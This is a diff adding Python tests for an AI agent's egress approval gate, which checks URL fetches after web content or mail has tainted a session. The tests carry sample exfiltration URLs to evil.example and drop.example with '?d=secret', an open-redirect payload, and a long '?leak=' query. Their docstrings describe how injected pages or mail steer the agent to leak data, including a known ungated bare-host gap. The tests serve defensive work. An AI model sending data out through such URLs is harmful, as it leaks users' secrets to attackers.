@@ -9438,6 +9438,158 @@ class TestTheFenceGoesUpWhenSomethingIsRead:
         ) == [f"{long_label}.x.example"]
 
 
+class TestSearchingIsReading:
+    """#293. Finding information is the first half of reading it, so a search
+    is a read whichever tool performs it — `web_search`, or a site's own search
+    box opened with `read_url`.
+
+    Replayed from `session-20260823-201444-431613`: a Gemini share link the
+    owner pasted tainted the task at step one, and every Allegro search aish
+    typed afterwards drew a card — six in one task, each keyed to a URL string
+    that never repeats, so no answer he could give covered the next one."""
+
+    SEARCHES = [
+        "https://allegro.pl/listing?string=wycieraczki+Chrysler+Pacifica+Bosch+AR26U+AR20U+H352",
+        "https://allegro.pl/listing?string=Bosch+AR26U+AR20U",
+        "https://allegro.pl/listing?string=wycieraczki+Pacifica+Bosch+H352",
+        "https://allegro.pl/uzytkownik/dasoil?string=3397008534",
+        "https://allegro.pl/listing?string=3397008534",
+        "https://allegro.pl/uzytkownik/RAFMAT-CHEMIA?string=3397008539",
+    ]
+
+    def _stub_web(self, monkeypatch):
+        import aish.agent as agent_module
+
+        fetched: list[str] = []
+        monkeypatch.setattr(
+            agent_module.web, "read_url",
+            lambda url, topic=None, **_kw: (fetched.append(url), f"page at {url}")[1],
+        )
+        return fetched
+
+    def _run_wiper_session(self, monkeypatch, task):
+        shared = "https://share.gemini.google/niX1J3p1agFn"
+        fetched = self._stub_web(monkeypatch)
+        asked: list = []
+        responses = [
+            model_says(tool_calls=[tool_call("read_url", url=shared)]),
+            *(model_says(tool_calls=[tool_call("read_url", url=u)]) for u in self.SEARCHES),
+            model_says("here are the wipers"),
+        ]
+        agent, _ = make_agent(
+            responses,
+            approve_tool=lambda name, args, preview=None: asked.append(preview) or True,
+        )
+        agent.run_task(task)
+        assert fetched == [shared, *self.SEARCHES]  # every search ran
+        return asked
+
+    def test_a_shop_the_page_named_asks_once_and_never_again(self, monkeypatch):
+        """The floor, and it is not zero. The owner's prompt was the bare share
+        link — allegro.pl came out of the PAGE, so something has to ask before
+        aish composes an address at a destination a web page chose. It asks
+        once; the five searches after it are free, and so is every search term
+        he never got to."""
+        asked = self._run_wiper_session(monkeypatch, "https://share.gemini.google/niX1J3p1agFn")
+        assert len(asked) == 1
+        assert "allegro.pl" in asked[0]
+
+    def test_the_grant_survives_a_search_term_that_never_repeats(self, monkeypatch):
+        """What made the old hold unanswerable: it was keyed to the URL string,
+        and no two searches share one. Six distinct `?string=` values, six
+        distinct paths, one card."""
+        asked = self._run_wiper_session(monkeypatch, "https://share.gemini.google/niX1J3p1agFn")
+        assert len(set(self.SEARCHES)) == 6  # nothing here repeats
+        assert len(asked) == 1
+
+    def test_a_vouched_shop_does_not_cover_an_address_pointing_elsewhere(self, monkeypatch):
+        """A yes for allegro.pl says nothing about an open redirect out of it:
+        that names a second destination he was never shown."""
+        self._stub_web(monkeypatch)
+        asked: list = []
+        agent, _ = make_agent(
+            [
+                model_says(tool_calls=[tool_call("read_url", url="https://blog.example/post")]),
+                model_says(tool_calls=[
+                    tool_call("read_url", url="https://allegro.pl/listing?string=Bosch")
+                ]),
+                model_says(tool_calls=[
+                    tool_call("read_url",
+                              url="https://allegro.pl/go?next=https://evil.example/?d=secret")
+                ]),
+                model_says("stopped"),
+            ],
+            approve_tool=lambda name, args, preview=None: asked.append(preview) or True,
+        )
+        agent.run_task("read the blog")
+        assert len(asked) == 2  # the shop once, then the forward on its own
+        assert "allegro.pl" in asked[1]
+
+    def test_a_forward_gates_even_when_the_forward_itself_carries_nothing(self):
+        """The presence of a nested address is the whole point — in a redirect
+        parameter a bare `https://evil.example/x` IS the forward. Asking it the
+        payload question is the rule that is right for a search query, where a
+        domain is a search term, and wrong here."""
+        agent, _ = make_agent([])
+        agent._tainted = True
+        agent._approved_hosts.add("allegro.pl")
+        assert agent._egress_novel_hosts(
+            "read_url", {"url": "https://allegro.pl/go?next=https://evil.example/x"}
+        ) == ["allegro.pl"]
+        assert agent._egress_novel_hosts(
+            "read_url", {"url": "https://allegro.pl/listing?string=Bosch+AR26U"}
+        ) is None
+
+    def test_the_bare_host_forward_is_a_known_residual(self):
+        """Pinned so it is a decision and not a surprise. `?to=evil.example` —
+        no scheme, no path — reads as an ordinary query value and is NOT
+        gated. Widening the address test to catch it would gate every search
+        whose terms look like a domain. It is a hop, not a payload: a value
+        actually carrying a secret is address-shaped or long enough to trip the
+        other tests. `docs/agent-core.md` says so out loud."""
+        agent, _ = make_agent([])
+        agent._tainted = True
+        agent._approved_hosts.add("allegro.pl")
+        assert agent._egress_novel_hosts(
+            "read_url", {"url": "https://allegro.pl/go?to=evil.example"}
+        ) is None
+        # …but the moment the value carries something, it is caught again.
+        assert agent._egress_novel_hosts(
+            "read_url", {"url": "https://allegro.pl/go?to=evil.example/?d=secret"}
+        ) == ["allegro.pl"]
+
+    def test_a_host_he_merely_mentioned_is_not_a_vouch(self, monkeypatch):
+        """#178 P0-2's asymmetry, and the reason this is safe. A host is in
+        provenance for appearing in text he TYPED OR PASTED, so an address
+        inside a forwarded mail is owner-authored by provenance and
+        attacker-chosen in fact. The first payload there still asks."""
+        self._stub_web(monkeypatch)
+        asked: list = []
+        agent, _ = make_agent(
+            [
+                model_says(tool_calls=[tool_call("read_url", url="https://blog.example/post")]),
+                model_says(tool_calls=[
+                    tool_call("read_url", url="https://drop.example/?d=secret")
+                ]),
+                model_says("stopped"),
+            ],
+            approve_tool=lambda name, args, preview=None: asked.append(preview) or True,
+        )
+        agent.run_task("have a look at this, someone sent me https://drop.example/x")
+        assert len(asked) == 1
+
+    def test_an_unattended_session_checks_a_known_host_too(self):
+        """Q4. A host in provenance returned from the unattended branch with no
+        payload check at all — laxer, unattended, than the attended path it
+        exists to be stricter than."""
+        agent, _ = make_agent([], origin="email")
+        agent.note_owner_hosts("check eon.pl for me")
+        assert agent._egress_novel_hosts(
+            "read_url", {"url": "https://eon.pl/x?leak=" + "A" * 200}
+        ) == ["eon.pl"]
+        assert agent._egress_novel_hosts("read_url", {"url": "https://eon.pl/faktury"}) is None
+
+
 class TestALinkThatArrivedByMail:
     """#279. Mail is the delivery mechanism for every account-recovery flow
     there is, so aish following a link by itself hands an injected turn the
